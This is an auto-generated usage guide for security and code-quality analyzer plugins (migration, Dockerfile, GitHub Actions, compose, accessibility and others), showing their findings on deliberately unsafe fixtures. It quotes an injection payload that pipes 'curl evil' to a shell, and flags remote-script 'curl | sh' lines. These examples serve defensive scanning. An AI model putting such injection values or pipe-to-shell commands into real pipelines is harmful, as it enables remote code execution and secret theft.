# Using the claude-skills plugins

_This document is auto-generated from real runs by [`tests/gen_usage.py`](../tests/gen_usage.py); the output blocks below are captured verbatim. Regenerate with `python3 tests/gen_usage.py`._

## How these skills work once installed

After `/plugin install <name>@claude-skills`, you don't call anything directly — you just talk to Claude. Each skill has trigger phrases in its `SKILL.md`, so asking *"is this migration safe?"* or *"audit my AI code"* makes Claude run the matching analyzer, read the findings, and explain + fix them for you.

Every analyzer is also a standalone, dependency-free CLI you can run yourself or wire into CI. Shared conventions:

- **Exit code** is `0` when clean and `1` when a finding meets the `--fail-on` threshold (default `high`) — so any analyzer doubles as a CI gate.
- **`--json`** emits machine-readable findings.
- **`--selftest`** verifies the analyzer itself.

The examples below are the exact fixtures shipped under each skill's `examples/` directory.

---

## 🛡️ migration-guard

### Catch an unsafe database migration

**Ask Claude:** _Is this migration safe to deploy to production?_

The skill activates and runs:

```bash
analyze_migration.py unsafe_migration.sql
```

Output:

```console
migration-guard found 7 item(s): 2 critical, 4 high, 1 low

[CRITICAL] PG004  CONCURRENTLY inside a transaction
  at unsafe_migration.sql:13
  > CREATE INDEX CONCURRENTLY idx_users_status ON users (status)
  why: CREATE/DROP INDEX CONCURRENTLY and REINDEX CONCURRENTLY cannot run inside a transaction block and will raise an error. Many migration frameworks wrap each migration in a transaction by default.
  fix: Run the statement outside any transaction. In Rails use `disable_ddl_transaction!`; in Django set `atomic = False`; in Alembic avoid the transactional wrapper for this migration.

[CRITICAL] PG007  ALTER COLUMN ... TYPE rewrites the table
  at unsafe_migration.sql:20
  > ALTER TABLE users ALTER COLUMN external_id TYPE bigint
  why: Changing a column's type generally rewrites the entire table under an ACCESS EXCLUSIVE lock, blocking reads and writes for the duration.
  fix: Add a new column of the target type, backfill in batches, swap reads to it, then drop the old column across multiple deploys. Some widening casts (e.g. varchar length increases) are exempt — verify for your case.

[HIGH] PG002  ADD COLUMN with a volatile DEFAULT
  at unsafe_migration.sql:7
  > ALTER TABLE users ADD COLUMN signup_token uuid NOT NULL DEFAULT gen_random_uuid()
  why: A volatile default (e.g. now(), gen_random_uuid(), random()) forces PostgreSQL to rewrite every row under an ACCESS EXCLUSIVE lock, even on PostgreSQL 11+ where constant defaults are cheap.
  fix: Add the column with no default, backfill existing rows in batches, then set the default for new rows in a separate statement.

[HIGH] PG003  CREATE INDEX without CONCURRENTLY
  at unsafe_migration.sql:10
  > CREATE INDEX idx_users_email ON users (email)
  why: Building an index without CONCURRENTLY holds a lock that blocks all writes (INSERT/UPDATE/DELETE) to the table until the build finishes.
  fix: Use `CREATE INDEX CONCURRENTLY` (note: it must run outside an explicit transaction and is not atomic — verify and retry on failure).

[HIGH] PG005  ADD FOREIGN KEY without NOT VALID
  at unsafe_migration.sql:16
  > ALTER TABLE orders ADD CONSTRAINT orders_user_fk FOREIGN KEY (user_id) REFERENCES users (id)
  why: Adding a foreign key validates every existing row while holding a lock on both the referencing and referenced tables.
  fix: Split into two steps: `ADD CONSTRAINT ... FOREIGN KEY ... NOT VALID`, then in a later statement/migration `VALIDATE CONSTRAINT` (which takes only a SHARE UPDATE EXCLUSIVE lock).

[HIGH] PG012  UPDATE/DELETE without a WHERE clause
  at unsafe_migration.sql:23
  > UPDATE users SET active = true
  why: An unqualified UPDATE or DELETE touches every row in one statement, holding row locks for the whole table, bloating WAL, and creating replication lag.
  fix: Add a WHERE clause and process large backfills in bounded batches (e.g. by primary-key ranges) with a commit between batches.

[LOW] PG016  No lock_timeout set before risky DDL
  at unsafe_migration.sql:1
  why: The migration performs locking DDL but never sets a lock_timeout. A blocked DDL statement can queue behind a long query and then block every query behind it.
  fix: Set a short guard at the top of the migration, e.g. `SET lock_timeout = '5s';` (and `statement_timeout`), so a contended lock fails fast instead of stalling the table.

FAIL: findings at or above 'high'. Review the locking behavior before applying this migration.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

The same analyzer accepts ORM migrations too — e.g. `analyze_migration.py unsafe_rails_migration.rb` flags `add_index` without `algorithm: :concurrently`.

---

### The online-safe rewrite passes

```console
migration-guard: no risky operations detected. ✓
```

_Exit code: **0**_

---

## 🩺 llm-app-doctor

### Audit AI integration code

**Ask Claude:** _Audit my Claude integration for leaked keys, injection, and dead models._

The skill activates and runs:

```bash
analyze_llm_code.py unsafe_app.py
```

Output:

```console
llm-app-doctor found 7 issue(s): 2 critical, 4 high, 1 medium

[CRITICAL] SEC001  Hard-coded API key in source
  at unsafe_app.py:7
  > <redacted key literal>
  why: A provider API key literal is committed in source. Anyone with repo access (or anyone the repo leaks to) can use it, and key rotation means a code change.
  fix: Load the key from an environment variable or secrets manager; never commit it. Rotate this key — assume it is compromised.

[CRITICAL] MOD001  Retired Anthropic model — returns 404
  at unsafe_app.py:33
  > .messages.create( model="claude-2.1", max_tokens=1024, messages=[{"role": "user", "content": prompt}], )
  why: `claude-2.1` has been retired and the API responds with a 404. Any request using it fails outright.
  fix: Switch to a current model: `claude-opus-4-8` (most capable), `claude-sonnet-4-6` (balanced), or `claude-haiku-4-5` (fast).

[HIGH] API002  `temperature` removed on this model (400)
  at unsafe_app.py:11
  > .messages.create( model="claude-opus-4-8", max_tokens=64000, # REL002: large max_tokens on a non-streaming call temperature=0.7, # API002...
  why: Sampling parameters (`temperature`/`top_p`/`top_k`) are removed on `claude-opus-4-8` and return a 400 — `temperature` is set here.
  fix: Delete the sampling parameter; steer behavior with prompting (and `output_config.effort` for depth).

[HIGH] REL002  Large max_tokens without streaming
  at unsafe_app.py:11
  > .messages.create( model="claude-opus-4-8", max_tokens=64000, # REL002: large max_tokens on a non-streaming call temperature=0.7, # API002...
  why: `max_tokens=64000` on a non-streaming request can exceed the SDK's HTTP timeout window — large outputs idle the connection until it drops (the Python SDK raises before sending).
  fix: Stream the request (`.stream(...)` / `stream=True`) for large `max_tokens`, then read `.get_final_message()` / `.finalMessage()`.

[HIGH] SEC002  Possible prompt-injection sink in system prompt
  at unsafe_app.py:16
  > "You are a support agent for {user_question}"
  why: Untrusted-looking input is interpolated into the system prompt. Content placed there carries operator authority, so a crafted input can override your instructions, and it also busts prompt caching.
  fix: Keep the system prompt static. Put user-supplied text in a user message, and on Opus 4.8 deliver trusted runtime context via a `{'role': 'system'}` message in `messages[]` rather than string interpolation.

[HIGH] API001  budget_tokens removed on this model (400)
  at unsafe_app.py:24
  > .messages.create( model="claude-opus-4-8", thinking={"type": "enabled", "budget_tokens": 8000}, messages=[{"role": "user", "content": f"S...
  why: `thinking.budget_tokens` is removed on `claude-opus-4-8` and returns a 400. Fixed thinking budgets are gone in favor of adaptive thinking.
  fix: Use `thinking={'type': 'adaptive'}` and control depth with `output_config={'effort': 'high'}` (low|medium|high|max).

[MEDIUM] REL001  Anthropic call missing max_tokens
  at unsafe_app.py:24
  > .messages.create( model="claude-opus-4-8", thinking={"type": "enabled", "budget_tokens": 8000}, messages=[{"role": "user", "content": f"S...
  why: The Anthropic Messages API requires `max_tokens`; omitting it errors. Even where optional, an unset cap risks runaway output and cost.
  fix: Set an explicit `max_tokens` (e.g. 16000 for non-streaming, up to 64000+ when streaming).

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

---

### Machine-readable output (`--json`) — also works on TS/JS

Scanning the TypeScript fixture with `--json` (first finding shown):

```json
{
  "rule": "MOD001",
  "severity": "critical",
  "title": "Retired Anthropic model \u2014 returns 404",
  "detail": "`claude-3-opus-20240229` has been retired and the API responds with a 404. Any request using it fails outright.",
  "fix": "Switch to a current model: `claude-opus-4-8` (most capable), `claude-sonnet-4-6` (balanced), or `claude-haiku-4-5` (fast).",
  "file": "unsafe_app.ts",
  "line": 8,
  "snippet": ".messages.create({ model: \"claude-3-opus-20240229\", // MOD001: retired -> 404 max_tokens: 64000, // REL002: large, non-streaming // SEC00..."
}
```

Top-level fields: `tool`, `knowledge_date`, `threshold`, `passed`, `count`, `findings[]`.

---

### The corrected app passes

```console
llm-app-doctor: no issues detected. ✓
```

_Exit code: **0**_

---

## 🐳 dockerfile-doctor

### Harden a Dockerfile

**Ask Claude:** _Review my Dockerfile for security and why the image is so big._

The skill activates and runs:

```bash
analyze_dockerfile.py Dockerfile.unsafe
```

Output:

```console
dockerfile-doctor found 8 issue(s): 3 high, 2 medium, 3 low

[HIGH] DKR001  Container runs as root (no USER set)
  at Dockerfile.unsafe:4
  > FROM ... (final stage)
  why: No `USER` instruction in the final stage, so the container runs as root by default — a compromise of the app is a root compromise of the container.
  fix: Add a non-root user and `USER <name>` before `CMD`/`ENTRYPOINT`.

[HIGH] DKR003  Secret baked into an ENV layer
  at Dockerfile.unsafe:7
  > ENV NPM_TOKEN=***
  why: `ENV NPM_TOKEN` persists in the final image and every layer's metadata — `docker history`/`inspect` reveals it. Build args and env vars are not a secret store.
  fix: Inject secrets at runtime (`docker run -e` / orchestrator secrets) or use BuildKit `--mount=type=secret`; never `ENV` them.

[HIGH] DKR010  Piping a remote script into a shell
  at Dockerfile.unsafe:19
  > RUN curl -fsSL https://example.com/install.sh | sh
  why: `curl ... | sh` executes unreviewed, unpinned remote code at build time — a classic supply-chain foothold.
  fix: Download to a file, verify a checksum/signature, inspect, then run it.

[MEDIUM] DKR002  Base image pinned to :latest
  at Dockerfile.unsafe:4
  > FROM node:latest
  why: `node:latest` uses the mutable `:latest` tag — builds are not reproducible.
  fix: Pin an explicit version tag or a digest.

[MEDIUM] DKR006  apt lists not cleaned in the same layer
  at Dockerfile.unsafe:15
  > RUN apt-get update && apt-get install -y python3 && pip3 install -r requirements.txt
  why: Leaving `/var/lib/apt/lists` in the layer permanently bloats the image — deleting it in a later RUN doesn't shrink the earlier layer.
  fix: End the install RUN with `&& rm -rf /var/lib/apt/lists/*` in the same layer.

[LOW] DKR005  apt install without --no-install-recommends
  at Dockerfile.unsafe:15
  > RUN apt-get update && apt-get install -y python3 && pip3 install -r requirements.txt
  why: Recommended packages pull in extra weight you didn't ask for, bloating the image.
  fix: Add `--no-install-recommends` to `apt-get install`.

[LOW] DKR007  pip install without --no-cache-dir
  at Dockerfile.unsafe:15
  > RUN apt-get update && apt-get install -y python3 && pip3 install -r requirements.txt
  why: pip's download cache stays in the layer, adding megabytes for no runtime benefit.
  fix: Add `--no-cache-dir` to `pip install`.

[LOW] DKR008  Dependencies installed after copying all source
  at Dockerfile.unsafe:15
  > RUN apt-get update && apt-get install -y python3 && pip3 install -r requirements.txt
  why: `COPY . .` (line 12) before the dependency install means any source change busts the cached dependency layer — every build reinstalls everything.
  fix: Copy only the manifest first (e.g. `COPY package.json package-lock.json ./`), install, then `COPY . .`.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

---

### The hardened, slimmed image passes

```console
dockerfile-doctor: no issues detected. ✓
```

_Exit code: **0**_

---

## 🔑 env-doctor

### Reconcile .env with code and the example

**Ask Claude:** _Is my .env in gitignore, and is my .env.example in sync with the code?_

The skill activates and runs:

```bash
analyze_env.py ./sample_project   # point it at a project root
```

Output:

```console
env-doctor found 7 issue(s): 3 high, 3 medium, 1 low

[HIGH] ENV001  .env file is not git-ignored
  at sample_project/.env
  why: `.env` holds real configuration/secrets but is not matched by .gitignore — one `git add .` away from committing secrets.
  fix: Add `.env` (and `.env.*`, keeping `!.env.example`) to .gitignore, and scrub it from history if it was ever committed.

[HIGH] ENV005  Placeholder/empty value in a real .env
  at sample_project/.env:2  (STRIPE_API_KEY)
  why: `STRIPE_API_KEY` in `.env` still has a placeholder/empty value — the app will start with a broken or missing setting.
  fix: Set a real value, or remove the line if the variable is unused.

[HIGH] ENV006  Real secret committed in the example file
  at sample_project/.env.example:2  (SENTRY_DSN)
  why: `SENTRY_DSN` in `.env.example` looks like a real value, not a placeholder. Example files are committed — this leaks the secret.
  fix: Replace the value with a placeholder (e.g. `your-key-here`) and rotate the exposed secret.

[MEDIUM] ENV004  Variable in .env is undocumented
  at sample_project/.env:2  (STRIPE_API_KEY)
  why: `STRIPE_API_KEY` is set in `.env` but absent from the example file — new contributors won't know it exists.
  fix: Add `STRIPE_API_KEY=` (with a placeholder) to your .env.example.

[MEDIUM] ENV004  Variable in .env is undocumented
  at sample_project/.env:3  (LEGACY_FLAG)
  why: `LEGACY_FLAG` is set in `.env` but absent from the example file — new contributors won't know it exists.
  fix: Add `LEGACY_FLAG=` (with a placeholder) to your .env.example.

[MEDIUM] ENV002  Required variable missing from .env.example
  at sample_project/app.py:4  (STRIPE_API_KEY)
  why: `STRIPE_API_KEY` is read by the code but not listed in any example file — a fresh checkout starts misconfigured and fails at runtime.
  fix: Add `STRIPE_API_KEY=` to your .env.example so onboarding is self-documenting.

[LOW] ENV003  Example variable is never used in code
  at sample_project/.env.example:2  (SENTRY_DSN)
  why: `SENTRY_DSN` is in `.env.example` but no source file reads it — likely stale documentation.
  fix: Remove `SENTRY_DSN` from the example, or wire it up if it's actually needed.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

Note `PORT` is read by the code but **not** flagged — it's a well-known runtime variable, not something `.env` must provide.

---

## 🔐 actions-guard

### Harden a GitHub Actions workflow

**Ask Claude:** _Is my CI workflow secure? Check for pwn requests and script injection._

The skill activates and runs:

```bash
analyze_workflow.py unsafe   # a repo root; finds .github/workflows/*.yml
```

Output:

```console
actions-guard found 7 issue(s): 1 critical, 3 high, 3 medium

[CRITICAL] GHA002  pull_request_target checks out untrusted PR code
  at unsafe/.github/workflows/ci.yml:1
  > on: pull_request_target + checkout of PR head
  why: A `pull_request_target` / `workflow_run` workflow runs with repo secrets and a write token, and here it checks out the PR head — so a fork PR can run its own code with your secrets (a 'pwn request').
  fix: Don't check out and build untrusted PR code in a privileged trigger. Use `pull_request` for build/test, and if you need labels/comments, keep the privileged job separate and never run PR-controlled code.

[HIGH] GHA001  Action pinned to a mutable ref, not a commit SHA
  at unsafe/.github/workflows/ci.yml:13
  > - uses: some-org/deploy-action@main # GHA001: branch ref (high)
  why: `some-org/deploy-action@main` is pinned to a tag/branch. Tags are mutable — the owner (or an attacker who compromises them) can move `main` to malicious code that then runs in your CI.
  fix: Pin to a full 40-char commit SHA: `some-org/deploy-action@<sha>  # main`. 

[HIGH] GHA003  Script injection: untrusted input in a run: shell
  at unsafe/.github/workflows/ci.yml:15
  > echo "Building PR: ${{ github.event.pull_request.title }}"
  why: An attacker-controlled expression (e.g. a PR title, branch name, or issue body) is interpolated straight into the shell. A crafted value like `"; curl evil | sh; #` runs arbitrary commands in your CI.
  fix: Never interpolate `github.event.*` / `github.head_ref` into `run:`. Bind it to an `env:` variable and reference it quoted (`"$TITLE"`), so the value can't break out of the string.

[HIGH] GHA007  Remote script piped into a shell
  at unsafe/.github/workflows/ci.yml:18
  > curl -sSL https://example.com/install.sh | sh
  why: `curl ... | sh` in CI executes unreviewed, unpinned remote code with your workflow's privileges — a supply-chain foothold.
  fix: Download to a file, verify a checksum/signature, then run it; or use a SHA-pinned action instead.

[MEDIUM] GHA004  No permissions: block — token defaults to broad scope
  at unsafe/.github/workflows/ci.yml:1
  why: Without an explicit `permissions:` key, the `GITHUB_TOKEN` gets the repository/organization default, often read-write to everything.
  fix: Add a top-level `permissions:` set to least privilege (e.g. `permissions: {contents: read}`) and widen per-job only as needed.

[MEDIUM] GHA001  Action pinned to a mutable ref, not a commit SHA
  at unsafe/.github/workflows/ci.yml:10
  > - uses: actions/checkout@v4 # GHA001: mutable tag, not a SHA
  why: `actions/checkout@v4` is pinned to a tag/branch. Tags are mutable — the owner (or an attacker who compromises them) can move `v4` to malicious code that then runs in your CI.
  fix: Pin to a full 40-char commit SHA: `actions/checkout@<sha>  # v4`. (Even first-party actions are safer SHA-pinned.)

[MEDIUM] GHA005  Secret interpolated directly into run:
  at unsafe/.github/workflows/ci.yml:19
  > publish --token ${{ secrets.NPM_TOKEN }}
  why: Interpolating `${{ secrets.* }}` into the script bakes the secret into the command line (visible in process listings / logs on error) and risks injection if combined with untrusted input.
  fix: Pass secrets via `env:` on the step (`env: {TOKEN: ${{ secrets.TOKEN }}}`) and reference `"$TOKEN"` in the script.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

---

### The hardened workflow passes

```console
actions-guard: no issues detected. ✓
```

_Exit code: **0**_

---

## 🔁 api-contract-guard

### Catch a breaking API change (GraphQL)

**Ask Claude:** _Did I break the API? Diff the old and new schema._

The skill activates and runs:

```bash
analyze_contract.py schema.old.graphql schema.new.graphql
```

Output:

```console
api-contract-guard [graphql] found 6 change(s): 5 high, 1 info

[HIGH] GQL004  Removed field
  at Query.posts
  why: Clients selecting this field get a validation error.
  fix: Deprecate with @deprecated before removal.

[HIGH] GQL006  New required argument
  at Query.user(region:)
  why: A new non-null argument without a default rejects existing queries that omit it.
  fix: Make it nullable or give it a default value.

[HIGH] GQL003  Removed enum/union member
  at Role.GUEST
  why: Clients that send or match this value break.
  fix: Keep the member, or deprecate it first.

[HIGH] GQL004  Removed field
  at User.age
  why: Clients selecting this field get a validation error.
  fix: Deprecate with @deprecated before removal.

[HIGH] GQL005  Field type changed
  at User.name (String -> Int)
  why: A changed field type can break client deserialization or non-null expectations.
  fix: Add a new field instead of changing this one.

[INFO] GQL100  New type (additive)
  at Team
  why: A new type was added — non-breaking.
  fix: No action needed.

FAIL: breaking changes at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

It auto-detects the format — pass two OpenAPI/Swagger JSON files and it diffs paths, operations, and required parameters instead.

---

### The same tool on OpenAPI / Swagger (JSON)

```console
api-contract-guard [openapi] found 4 change(s): 3 high, 1 info

[HIGH] OAS001  Removed endpoint
  at /reports
  why: The path no longer exists; clients calling it get a 404.
  fix: Restore the path, or deprecate it for a release before removal.

[HIGH] OAS004  Parameter became required
  at POST /users (role in query)
  why: A previously optional parameter is now required; clients that don't send it break.
  fix: Keep it optional, or version the endpoint.

[HIGH] OAS003  New required parameter
  at POST /users (team in query)
  why: A new required parameter means existing clients that omit it now get rejected.
  fix: Make the parameter optional, or version the endpoint.

[INFO] OAS100  New endpoint (additive)
  at /audit
  why: A new path was added — non-breaking.
  fix: No action needed.

FAIL: breaking changes at or above 'high'.
```

_Exit code: **1**_

---

## 🐙 compose-guard

### Harden a Docker Compose stack

**Ask Claude:** _Is my docker-compose file secure? Why is mounting docker.sock bad?_

The skill activates and runs:

```bash
analyze_compose.py docker-compose.unsafe.yml
```

Output:

```console
compose-guard found 10 issue(s): 2 critical, 6 high, 2 medium

[CRITICAL] CMP001  Service runs privileged
  at docker-compose.unsafe.yml:5  (service: api)
  > privileged: true
  why: `privileged: true` disables nearly all container isolation — the container gets access to host devices and can trivially escape to root on the host.
  fix: Remove `privileged: true`. If a specific capability is genuinely needed, add only that one via `cap_add:` and keep the rest dropped.

[CRITICAL] CMP002  Docker socket mounted into the container
  at docker-compose.unsafe.yml:14  (service: volumes)
  > - /var/run/docker.sock:/var/run/docker.sock
  why: Mounting the Docker socket gives the container full control of the Docker daemon — it can start a privileged container and take over the host. 
  fix: Don't mount the socket. If the container must orchestrate containers, use a scoped socket proxy that allow-lists only the endpoints it needs.

[HIGH] CMP003  Host namespace shared (network_mode: host)
  at docker-compose.unsafe.yml:6  (service: api)
  > network_mode: host
  why: `network_mode: host` removes the namespace boundary between the container and the host — host network interfaces, processes, or shared memory become directly reachable.
  fix: Remove `network_mode: host` and use normal bridge networking / isolated namespaces; publish only the ports you need.

[HIGH] CMP004  Dangerous capability added
  at docker-compose.unsafe.yml:8  (service: cap_add)
  > - SYS_ADMIN
  why: `SYS_ADMIN` grants host-level power (e.g. SYS_ADMIN is close to root; ALL removes the capability boundary entirely).
  fix: Drop it, or use the narrowest capability plus `cap_drop: [ALL]`.

[HIGH] CMP008  Container sandboxing disabled via security_opt
  at docker-compose.unsafe.yml:10  (service: security_opt)
  > - seccomp:unconfined
  why: Setting seccomp or AppArmor to `unconfined` removes the syscall / MAC filter that blocks most container-escape techniques.
  fix: Remove the `unconfined` setting; if one syscall is blocked, ship a custom seccomp profile that allows just that syscall.

[HIGH] CMP006  Secret hard-coded in the compose file
  at docker-compose.unsafe.yml:12  (service: environment)
  > DB_PASSWORD: ***
  why: `DB_PASSWORD` has a literal value. Compose files are committed, so the credential is in version control and visible to anyone with repo access.
  fix: Reference an environment variable (`${DB_PASSWORD}`) supplied at deploy time, or use Docker/orchestrator secrets; rotate the exposed value.

[HIGH] CMP007  Sensitive host path bind-mounted (read-write)
  at docker-compose.unsafe.yml:15  (service: volumes)
  > - /etc:/host-etc
  why: `/etc` is a sensitive host location. Mounting it read-write lets the container modify host state (and often escalate to host root).
  fix: Mount only the specific subdirectory the service needs, and add `:ro` unless writes are genuinely required.

[HIGH] CMP006  Secret hard-coded in the compose file
  at docker-compose.unsafe.yml:22  (service: environment)
  > POSTGRES_PASSWORD: ***
  why: `POSTGRES_PASSWORD` has a literal value. Compose files are committed, so the credential is in version control and visible to anyone with repo access.
  fix: Reference an environment variable (`${DB_PASSWORD}`) supplied at deploy time, or use Docker/orchestrator secrets; rotate the exposed value.

[MEDIUM] CMP005  Image pinned to :latest
  at docker-compose.unsafe.yml:4  (service: api)
  > image: mycompany/api:latest
  why: `mycompany/api:latest` uses the mutable `:latest` tag — deploys are not reproducible.
  fix: Pin an explicit version tag or a digest.

[MEDIUM] CMP009  PostgreSQL port published on all interfaces
  at docker-compose.unsafe.yml:20  (service: ports)
  > - "5432:5432"
  why: Publishing `5432:5432` with no host IP binds to 0.0.0.0, exposing the datastore beyond the host (often to the public internet on a cloud VM).
  fix: Don't publish it at all if only other compose services need it (use the internal network), or bind to loopback: `127.0.0.1:5432:5432`.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

---

### The hardened stack passes

```console
compose-guard: no issues detected. ✓
```

_Exit code: **0**_

---

## ♿ a11y-guard

### Find accessibility barriers in a React component

**Ask Claude:** _Is this component accessible? Check it for screen readers and keyboard users._

The skill activates and runs:

```bash
analyze_a11y.py unsafe_widget.jsx
```

Output:

```console
a11y-guard found 4 issue(s): 3 high, 1 medium

[HIGH] A11Y003  Click handler on non-interactive <div>
  at unsafe_widget.jsx:6
  > <div onClick={onSave}>
  why: A click handler on a div/span is unreachable by keyboard and invisible to assistive tech: it can't be focused, activated with Enter/Space, or announced as a control. Missing: `role`, `tabIndex={0}`, a keyboard handler.
  fix: Use a real `<button>` (best — you get focus, Enter/Space, and the right role for free). If you must keep the element, add `role="button"`, `tabIndex={0}`, and an Enter/Space key handler.

[HIGH] A11Y002  <button> has no accessible name
  at unsafe_widget.jsx:9
  > <button onClick={onClose}>
  why: An icon-only control with no text and no `aria-label` is announced as just "button" or "link", so its purpose is unknowable without sight.
  fix: Add `aria-label="Close dialog"` (or visible text, or visually hidden text). If it wraps an icon, label the control, not the icon.

[HIGH] A11Y006  aria-hidden on a focusable element
  at unsafe_widget.jsx:15
  > <button aria-hidden="true" onClick={onSave}>
  why: The element is still keyboard-focusable but hidden from assistive tech, so a screen-reader user can focus something that announces nothing — a classic 'ghost focus' trap.
  fix: Remove `aria-hidden`, or make the element unfocusable too (`tabindex="-1"` plus `disabled` where applicable).

[MEDIUM] A11Y007  <a> without href
  at unsafe_widget.jsx:12
  > <a onClick={goHome}>
  why: An anchor with no `href` is not focusable or activatable by keyboard and is not announced as a link or a button.
  fix: If it navigates, give it a real `href`. If it performs an action, use `<button>` instead.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

It reads HTML too — `analyze_a11y.py unsafe_page.html` additionally flags missing `alt` text, unlabelled inputs, a missing `<html lang>`, a zoom-blocking viewport, and "click here" link text.

---

### The accessible rewrites pass

```console
a11y-guard: no accessibility issues detected. ✓
```

_Exit code: **0**_

> Automated checks catch only a subset of real barriers. Passing this linter is a floor, not a ceiling — colour contrast, focus order, and whether the `alt` text is *useful* still need a human (ideally screen-reader) pass.

---

## 📝 commit-lint

### Lint a commit message

**Ask Claude:** _Is this a valid conventional commit?_

The skill activates and runs:

```bash
commit_lint.py lint -m "Added new stuff."
```

Output:

```console
commit-lint found 1 issue(s) in 1 commit(s): 1 high

[HIGH] CL002  Header does not follow Conventional Commits
  at 'Added new stuff.'
  why: `Added new stuff.` doesn't match `type(scope)!: subject`.
  fix: Add a type prefix and colon: `feat: Added new stuff` (or fix/docs/chore/…). Lowercase the subject and use the imperative mood.

FAIL: findings at or above 'high'.
```

_Exit code: **1**_ — non-zero because findings met the threshold, so this also fails a CI check.

---

### A conforming message passes

```console
commit-lint: 1 commit(s) checked, all conform. ✓
```

_Exit code: **0**_

Lint a whole PR with `--range origin/main..HEAD`, or wire it into a `commit-msg` hook (see `examples/commit-msg-hook.sh`).

---

### Generate a changelog from git history

```bash
commit_lint.py changelog --range v1.1.0..HEAD --version 1.2.0 --date 2026-07-24
```

Run against this repository's own history, that produces:

```markdown
## 1.2.0 — 2026-07-24

### Other

- Add actions-guard and api-contract-guard; ignore __pycache__ (8b748791684b)
- Add docs/USAGE.md and generator (follow-up to #2) (#3) (1fabee99cb43)
- Add CI status badge to README (3f57d6dd8139)
- Add CI workflow and end-to-end test harness (0d121d9d7fda)
- Add dockerfile-doctor, env-doctor, regression-finder (276417947b22)
- Add llm-app-doctor: static auditor for AI/LLM integration code (060d3ae4f6cd)
- Add migration-guard: database migration safety analyzer skill (2275673324f8)
- Initial commit (80d8eaf01169)
```

Breaking changes are listed first, scopes are bolded, and commits that don't follow the convention land under **Other** rather than being dropped.

---

## 🎲 flaky-test-hunter

### Hunt a flaky test

**Ask Claude:** _This test fails randomly in CI — which tests are actually flaky, and why?_

The skill activates and runs:

```bash
hunt_flaky.py -n 12 --cmd "python3 examples/flaky_suite.py"
```

Output:

```console
flaky-test-hunter: 12 run(s), 12 with a non-zero exit code

  run   1  FAIL  3 passed, 2 failed  (0.0s)
  run   2  FAIL  3 passed, 2 failed  (0.0s)
  run   3  FAIL  4 passed, 1 failed  (0.0s)
  run   4  FAIL  4 passed, 1 failed  (0.0s)
  run   5  FAIL  3 passed, 2 failed  (0.0s)
  run   6  FAIL  2 passed, 3 failed  (0.0s)
  run   7  FAIL  4 passed, 1 failed  (0.0s)
  run   8  FAIL  4 passed, 1 failed  (0.0s)
  run   9  FAIL  3 passed, 2 failed  (0.0s)
  run  10  FAIL  3 passed, 2 failed  (0.0s)
  run  11  FAIL  3 passed, 2 failed  (0.0s)
  run  12  FAIL  3 passed, 2 failed  (0.0s)

FLAKY — passed in some runs and failed in others (3 test(s), most unstable first):

  examples/flaky_suite.py::test_timeout_prone
    failed 4/12 runs (33%)  — runs [5, 6, 9, 11]
    likely cause: timing — Test depends on wall-clock timing or a fixed sleep
      signals: timed out
      fix: Replace sleeps with explicit waits on the condition itself (poll with a deadline, or await a real signal/event). Never assert on elapsed time; inject a fake clock instead of sleeping.

  examples/flaky_suite.py::test_race_condition
    failed 3/12 runs (25%)  — runs [1, 2, 12]
    likely cause: concurrency — Race condition between concurrent operations
      signals: concurrent, data race, lock, thread
      fix: Add proper synchronization, or make the test deterministic by serializing the interleaving under test. Run with a race detector (`go test -race`, thread sanitizer) to find the real ordering bug.

  examples/flaky_suite.py::test_unseeded_random
    failed 2/12 runs (17%)  — runs [6, 10]
    likely cause: randomness — Unseeded randomness makes the assertion non-deterministic
      signals: random, seed, uuid
      fix: Seed the RNG to a fixed value in test setup, or assert on invariants (shape, membership, count) rather than exact random values.

CONSISTENTLY FAILING (1) — broken, not flaky:
  examples/flaky_suite.py::test_always_broken  (failed 12/12)

FAIL: flaky tests observed.
```

_Exit code: **1**_ — flaky tests were observed.

The bundled fixture is deliberately non-deterministic (a simulated race, a timeout, and an unseeded-random assertion, plus one *consistently* broken test). Note the tool separates the consistently-failing test from the flaky ones — that one is broken, not flaky — and reports a failure **rate** per test, because a single run proves nothing about a flaky test. Exact rates vary per invocation by nature.

---

## 🔍 regression-finder

### Find the commit that broke a test

**Ask Claude:** _Which commit broke this test? It passed a few commits ago._

The skill activates and runs:

```bash
regression_finder.py --good HEAD~5 --bad HEAD --verify \
    --cmd "python3 -B test_calc.py"
```

Output:

```console
verify: running command at --good (HEAD~5) ...
ok
verify: running command at --bad (HEAD) ...
verify: good passes, bad fails — proceeding to bisect.

bisecting between good=a1b2c3d and bad=e4f5a6b ...

running 'sh' '-c' 'python3 -B test_calc.py'
ok
Bisecting: 0 revisions left to test after this (roughly 1 step)
[c7d8e9f] unrelated 1
running 'sh' '-c' 'python3 -B test_calc.py'
Bisecting: 0 revisions left to test after this (roughly 0 steps)
[0a1b2c3] refactor add (introduces bug)
running 'sh' '-c' 'python3 -B test_calc.py'
0a1b2c3 is the first bad commit
commit 0a1b2c3
Author: dev <dev@example.com>
Date:   Sat Jul 25 04:23:22 2026 +0000

    refactor add (introduces bug)

 calc.py | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
bisect found first bad commit
Traceback (most recent call last):
  File "/tmp/demo-repo/test_calc.py", line 2, in <module>
    assert add(2, 3) == 5
           ^^^^^^^^^^^^^^
AssertionError
Traceback (most recent call last):
  File "/tmp/demo-repo/test_calc.py", line 2, in <module>
    assert add(2, 3) == 5
           ^^^^^^^^^^^^^^
AssertionError

============================================================
CULPRIT — first commit where the command fails:
  0a1b2c3  dev  2026-07-25
  refactor add (introduces bug)

Files changed:
 calc.py | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
============================================================

Inspect the full diff with:  git show 0a1b2c3
```

_Exit code: **0**_ — a culprit was found. (Exit `1` means bisect couldn't conclude; `2` means a precondition failed, e.g. a dirty tree.)

